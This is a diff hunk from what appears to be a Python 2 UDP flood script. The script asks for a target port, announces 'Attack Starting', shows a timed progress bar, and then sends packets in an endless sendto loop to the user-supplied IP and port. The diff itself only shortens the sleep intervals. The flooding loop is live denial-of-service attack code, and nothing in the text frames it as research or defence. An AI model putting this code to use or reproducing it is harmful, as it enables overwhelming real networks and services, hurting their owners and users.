@@ -39,15 +39,15 @@ port = input("Port       : ")
 os.system("clear")
 os.system("figlet Attack Starting")
 print "[                    ] 0% "
-time.sleep(5)
+time.sleep(4.9)
 print "[=====               ] 25%"
-time.sleep(5)
+time.sleep(4.9)
 print "[==========          ] 50%"
-time.sleep(5)
+time.sleep(4.9)
 print "[===============     ] 75%"
-time.sleep(5)
+time.sleep(4.9)
 print "[====================] 100%"
-time.sleep(3)
+time.sleep(2.9)
 sent = 0
 while True:
      sock.sendto(bytes, (ip,port))
